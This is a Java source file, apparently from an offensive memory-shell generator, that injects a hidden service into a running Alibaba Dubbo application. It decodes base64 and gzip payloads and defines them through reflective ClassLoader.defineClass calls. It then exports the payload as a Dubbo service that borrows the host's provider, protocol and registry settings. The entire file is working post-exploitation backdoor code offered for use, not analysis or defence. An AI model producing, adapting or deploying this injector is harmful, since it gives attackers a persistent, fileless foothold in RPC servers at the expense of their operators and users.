package com.reajason.javaweb.memshell.injector.dubbo;

import com.alibaba.dubbo.common.URL;
import com.alibaba.dubbo.common.bytecode.ClassGenerator;
import com.alibaba.dubbo.common.utils.ClassHelper;
import com.alibaba.dubbo.config.*;
import com.alibaba.dubbo.config.model.ApplicationModel;
import com.alibaba.dubbo.config.model.ProviderModel;
import javassist.ClassPool;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.PrintWriter;
import java.io.StringWriter;
import java.lang.reflect.Constructor;
import java.lang.reflect.Method;
import java.lang.reflect.Modifier;
import java.security.ProtectionDomain;
import java.util.ArrayList;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Map;
import java.util.concurrent.ConcurrentHashMap;
import java.util.zip.GZIPInputStream;

public class AlibabaDubboServiceInjector {
    private final Map<String, ServiceConfig<?>> dynamicServices = new ConcurrentHashMap<>();
    private static final String DISPLAY_HOST = "x.x.x.x";
    private static String msg = "";
    private static boolean ok = false;

    public String getUrlPattern() {
        return "{{urlPattern}}";
    }

    public String getClassName() {
        return "{{className}}";
    }

    public String getBase64String() {
        return "{{base64Str}}";
    }

    public String getHelperBase64String() {
        return "{{helperBase64String}}";
    }

    public AlibabaDubboServiceInjector() {
        if (ok) {
            return;
        }
        try {
            msg += registerService();
        } catch (Throwable e) {
            msg += "unexcepted error: " + stackTrace(e);
        }
        ok = true;
        System.out.println(msg);
    }

    public String registerService() throws Exception {
        String servicePath = normalizePath(getUrlPattern());
        if (servicePath.isEmpty()) {
            throw new IllegalArgumentException("path must not be empty");
        }

        if (dynamicServices.containsKey(servicePath) || findRegisteredService(servicePath) != null) {
            return resolveServiceAddresses(servicePath);
        }

        Class<?> serviceInterface = loadClass(getHelperBase64String());
        Class<?> serviceImpl = loadClass(getBase64String());
        validateServiceTypes(serviceInterface, serviceImpl);

        ServiceConfig<?> serviceConfig = createServiceConfig(servicePath, serviceInterface, instantiate(serviceImpl));
        if (dynamicServices.putIfAbsent(servicePath, serviceConfig) != null) {
            return resolveServiceAddresses(servicePath);
        }

        try {
            serviceConfig.export();
            return resolveServiceAddresses(servicePath);
        } catch (RuntimeException e) {
            dynamicServices.remove(servicePath, serviceConfig);
            throw e;
        }
    }

    private Class<?> loadClass(String payload) throws Exception {
        ClassLoader classLoader = ClassHelper.getClassLoader(ClassGenerator.class);
        byte[] classBytes = gzipDecompress(decodeBase64(payload));
        definePackageIfNeeded(classLoader, getClassName());
        Class<?> loadedClass = defineClass(classLoader, classBytes);
        registerInJavassistClassPool(classLoader, classBytes);
        return loadedClass;
    }

    private Class<?> defineClass(ClassLoader classLoader, byte[] classBytes) throws Exception {
        ProtectionDomain protectionDomain = ClassGenerator.class.getProtectionDomain();
        Method defineClass = ClassLoader.class.getDeclaredMethod(
                "defineClass",
                String.class,
                byte[].class,
                int.class,
                int.class,
                ProtectionDomain.class
        );
        defineClass.setAccessible(true);
        return (Class<?>) defineClass.invoke(classLoader, null, classBytes, 0, classBytes.length, protectionDomain);
    }

    private void definePackageIfNeeded(ClassLoader classLoader, String className) {
        int packageEnd = className.lastIndexOf('.');
        if (packageEnd < 0) {
            return;
        }

        String packageName = className.substring(0, packageEnd);
        try {
            Method getPackage = ClassLoader.class.getDeclaredMethod("getPackage", String.class);
            getPackage.setAccessible(true);
            if (getPackage.invoke(classLoader, packageName) != null) {
                return;
            }

            Method definePackage = ClassLoader.class.getDeclaredMethod(
                    "definePackage",
                    String.class,
                    String.class,
                    String.class,
                    String.class,
                    String.class,
                    String.class,
                    String.class,
                    java.net.URL.class
            );
            definePackage.setAccessible(true);
            definePackage.invoke(classLoader, packageName, null, null, null, null, null, null, null);
        } catch (Exception ignored) {
            // Defining the package is a convenience for older class loaders. The class can still load without it.
        }
    }

    private void registerInJavassistClassPool(ClassLoader classLoader, byte[] classBytes) {
        try {
            ClassPool classPool = ClassGenerator.getClassPool(classLoader);
            classPool.makeClass(new ByteArrayInputStream(classBytes));
        } catch (Throwable ignored) {
            // Dubbo's proxy generator can still resolve already-defined classes if Javassist registration fails.
        }
    }

    private static byte[] decodeBase64(String value) throws Exception {
        Object decoder = Class.forName("sun.misc.BASE64Decoder").newInstance();
        return (byte[]) decoder.getClass().getMethod("decodeBuffer", String.class).invoke(decoder, value);
    }

    private static byte[] gzipDecompress(byte[] bytes) throws Exception {
        GZIPInputStream inputStream = null;
        ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
        try {
            inputStream = new GZIPInputStream(new ByteArrayInputStream(bytes));
            byte[] buffer = new byte[4096];
            int read;
            while ((read = inputStream.read(buffer)) > 0) {
                outputStream.write(buffer, 0, read);
            }
            return outputStream.toByteArray();
        } finally {
            if (inputStream != null) {
                inputStream.close();
            }
            outputStream.close();
        }
    }

    private void validateServiceTypes(Class<?> serviceInterface, Class<?> serviceImpl) {
        if (!serviceInterface.isInterface()) {
            throw new IllegalArgumentException("not an interface: " + serviceInterface.getName());
        }
        if (serviceImpl.isInterface() || Modifier.isAbstract(serviceImpl.getModifiers())) {
            throw new IllegalArgumentException("implementation class is not instantiable: " + serviceImpl.getName());
        }
        if (!serviceInterface.isAssignableFrom(serviceImpl)) {
            throw new IllegalArgumentException(serviceImpl.getName() + " does not implement " + serviceInterface.getName());
        }
    }

    private Object instantiate(Class<?> serviceImpl) {
        try {
            Constructor<?> constructor = serviceImpl.getDeclaredConstructor();
            constructor.setAccessible(true);
            return constructor.newInstance();
        } catch (Exception e) {
            throw new IllegalArgumentException("failed to instantiate " + serviceImpl.getName(), e);
        }
    }

    private ServiceConfig<Object> createServiceConfig(String servicePath, Class<?> serviceInterface, Object serviceImpl) {
        ServiceConfig<Object> serviceConfig = new ServiceConfig<Object>();
        serviceConfig.setInterface(serviceInterface);
        serviceConfig.setRef(serviceImpl);
        serviceConfig.setPath(servicePath);

        ProviderConfig providerConfig = findProviderConfig();
        if (providerConfig != null) {
            serviceConfig.setProvider(providerConfig);
            if (notEmpty(providerConfig.getVersion())) {
                serviceConfig.setVersion(providerConfig.getVersion());
            }
        }

        ApplicationConfig applicationConfig = findApplicationConfig(providerConfig);
        if (applicationConfig != null) {
            serviceConfig.setApplication(applicationConfig);
        }

        List<ProtocolConfig> protocolConfigs = findProtocolConfigs(providerConfig);
        if (!protocolConfigs.isEmpty()) {
            serviceConfig.setProtocols(protocolConfigs);
        }

        List<RegistryConfig> registryConfigs = findRegistryConfigs(providerConfig, applicationConfig);
        if (!registryConfigs.isEmpty()) {
            serviceConfig.setRegistries(registryConfigs);
        }

        return serviceConfig;
    }

    private ServiceConfig<?> findRegisteredService(String servicePath) {
        String normalizedPath = normalizePath(servicePath);
        for (ProviderModel providerModel : providerModels()) {
            ServiceConfig<?> serviceConfig = providerModel.getMetadata();
            if (serviceConfig != null && normalizedPath.equals(normalizePath(serviceConfig.getPath()))) {
                return serviceConfig;
            }
        }
        return null;
    }

    private ProviderConfig findProviderConfig() {
        for (ProviderModel providerModel : providerModels()) {
            ServiceConfig<?> serviceConfig = providerModel.getMetadata();
            if (serviceConfig != null && serviceConfig.getProvider() != null) {
                return serviceConfig.getProvider();
            }
        }
        return null;
    }

    private ApplicationConfig findApplicationConfig(ProviderConfig providerConfig) {
        if (providerConfig != null && providerConfig.getApplication() != null) {
            return providerConfig.getApplication();
        }

        for (ProviderModel providerModel : providerModels()) {
            com.alibaba.dubbo.config.ServiceConfig<?> serviceConfig = providerModel.getMetadata();
            if (serviceConfig == null) {
                continue;
            }
            if (serviceConfig.getApplication() != null) {
                return serviceConfig.getApplication();
            }
            if (serviceConfig.getProvider() != null && serviceConfig.getProvider().getApplication() != null) {
                return serviceConfig.getProvider().getApplication();
            }
        }
        return null;
    }

    private List<ProtocolConfig> findProtocolConfigs(ProviderConfig providerConfig) {
        List<ProtocolConfig> protocols = new ArrayList<ProtocolConfig>();
        addProtocols(protocols, providerConfig == null ? null : providerConfig.getProtocols());
        for (ProviderModel providerModel : providerModels()) {
            ServiceConfig<?> serviceConfig = providerModel.getMetadata();
            if (serviceConfig == null) {
                continue;
            }
            addProtocols(protocols, serviceConfig.getProtocols());
            addProtocols(protocols, serviceConfig.getProvider() == null ? null : serviceConfig.getProvider().getProtocols());
        }
        return uniqueProtocols(protocols);
    }

    private List<RegistryConfig> findRegistryConfigs(ProviderConfig providerConfig, ApplicationConfig applicationConfig) {
        List<RegistryConfig> registries = registries(providerConfig == null ? null : providerConfig.getRegistries());
        if (!registries.isEmpty()) {
            return registries;
        }

        registries = registries(applicationConfig == null ? null : applicationConfig.getRegistries());
        if (!registries.isEmpty()) {
            return registries;
        }

        for (ProviderModel providerModel : providerModels()) {
            ServiceConfig<?> serviceConfig = providerModel.getMetadata();
            if (serviceConfig == null) {
                continue;
            }

            registries = registries(serviceConfig.getRegistries());
            if (!registries.isEmpty()) {
                return registries;
            }

            ProviderConfig serviceProvider = serviceConfig.getProvider();
            registries = registries(serviceProvider == null ? null : serviceProvider.getRegistries());
            if (!registries.isEmpty()) {
                return registries;
            }

            ApplicationConfig serviceApplication = serviceConfig.getApplication();
            registries = registries(serviceApplication == null ? null : serviceApplication.getRegistries());
            if (!registries.isEmpty()) {
                return registries;
            }
        }

        return new ArrayList<RegistryConfig>();
    }

    private String resolveServiceAddresses(String servicePath) {
        String normalizedPath = normalizePath(servicePath);
        ServiceConfig<?> serviceConfig = dynamicServices.get(normalizedPath);
        if (serviceConfig == null) {
            serviceConfig = findRegisteredService(normalizedPath);
        }
        if (serviceConfig == null) {
            return normalizedPath;
        }

        List<URL> exportedUrls = serviceConfig.getExportedUrls();
        if (exportedUrls != null && !exportedUrls.isEmpty()) {
            return formatUrls(exportedUrls);
        }

        List<ProtocolConfig> protocols = uniqueProtocols(serviceConfig.getProtocols());
        if (protocols.isEmpty() && serviceConfig.getProvider() != null) {
            protocols = uniqueProtocols(serviceConfig.getProvider().getProtocols());
        }
        if (protocols.isEmpty()) {
            return normalizedPath;
        }

        return formatProtocolAddresses(protocols, normalizedPath);
    }

    private String formatUrls(List<URL> urls) {
        StringBuilder builder = new StringBuilder();
        for (URL url : urls) {
            if (builder.length() > 0) {
                builder.append(", ");
            }
            builder.append(formatUrl(url));
        }
        return builder.toString();
    }

    private String formatProtocolAddresses(List<ProtocolConfig> protocols, String path) {
        StringBuilder builder = new StringBuilder();
        for (ProtocolConfig protocol : protocols) {
            if (builder.length() > 0) {
                builder.append(", ");
            }
            builder.append(formatProtocolAddress(protocol, path));
        }
        return builder.toString();
    }

    private String formatUrl(URL url) {
        String path = normalizePath(url.getPath());
        int port = url.getPort();
        return port > 0
                ? String.format("%s://%s:%d/%s", url.getProtocol(), DISPLAY_HOST, port, path)
                : String.format("%s://%s/%s", url.getProtocol(), DISPLAY_HOST, path);
    }

    private String formatProtocolAddress(ProtocolConfig protocol, String path) {
        String protocolName = notEmpty(protocol.getName()) ? protocol.getName() : "dubbo";
        Integer port = protocol.getPort();
        return port != null && port > 0
                ? String.format("%s://%s:%d/%s", protocolName, DISPLAY_HOST, port, path)
                : String.format("%s://%s/%s", protocolName, DISPLAY_HOST, path);
    }

    private List<ProviderModel> providerModels() {
        try {
            return ApplicationModel.allProviderModels();
        } catch (Throwable ignored) {
            return new ArrayList<ProviderModel>();
        }
    }

    private void addProtocols(List<ProtocolConfig> target, List<ProtocolConfig> source) {
        if (source != null) {
            target.addAll(source);
        }
    }

    private List<ProtocolConfig> uniqueProtocols(List<ProtocolConfig> protocols) {
        Map<String, ProtocolConfig> unique = new LinkedHashMap<String, ProtocolConfig>();
        if (protocols != null) {
            for (ProtocolConfig protocol : protocols) {
                if (protocol != null) {
                    unique.put(protocolKey(protocol), protocol);
                }
            }
        }
        return new ArrayList<ProtocolConfig>(unique.values());
    }

    private List<RegistryConfig> registries(List<RegistryConfig> registries) {
        return registries == null ? new ArrayList<RegistryConfig>() : new ArrayList<RegistryConfig>(registries);
    }

    private String protocolKey(ProtocolConfig protocol) {
        return String.valueOf(protocol.getName())
                + "|"
                + String.valueOf(protocol.getHost())
                + "|"
                + String.valueOf(protocol.getPort())
                + "|"
                + String.valueOf(protocol.getServer())
                + "|"
                + String.valueOf(protocol.getId());
    }

    private String normalizePath(String path) {
        if (path == null) {
            return "";
        }

        String normalized = path.trim();
        while (normalized.startsWith("/")) {
            normalized = normalized.substring(1);
        }
        return normalized;
    }

    private boolean notEmpty(String value) {
        return value != null && !value.isEmpty();
    }

    private String stackTrace(Throwable throwable) {
        StringWriter writer = new StringWriter();
        throwable.printStackTrace(new PrintWriter(writer));
        return writer.toString();
    }
}
